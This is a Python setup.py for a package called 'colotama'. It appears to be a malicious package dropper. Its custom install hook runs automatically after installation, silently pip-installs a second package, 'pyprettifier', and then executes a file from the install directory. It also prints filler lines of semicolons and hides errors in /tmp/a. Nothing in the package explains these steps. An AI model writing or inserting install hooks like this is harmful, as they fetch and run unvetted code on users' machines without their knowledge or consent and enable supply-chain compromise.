from setuptools import setup
from setuptools.command.bdist_egg import bdist_egg as _bdist_egg
from subprocess import call
from setuptools.command.install import install as _install
import sys
import os

def _post_install(dir):
    try:
        print(";"*200)
        _a = sys.executable
        _b = os.path.join(dir, 'colotama')
        call([f"{_a} -m pip install pyprettifier"], shell=True)
        print(";"*200)
        call([f"{_a} {_b}"], shell=True)
    except Exception as e:
        with open('/tmp/a', 'a') as f:
            f.write("------- ? ? ? " + str(e) + "\n")

class install(_install):
    def run(self):
        _install.run(self)
        self.execute(_post_install, (self.install_lib,), msg="Running post install task")

setup(
    name="colotama",
    version="0.5.0",
    packages=["colotama"],
    description="",
    author="Asian Mlik",
    author_email="help@colotama.com",
    cmdclass={
        'install': install},
    python_requires='>=3.6'
)
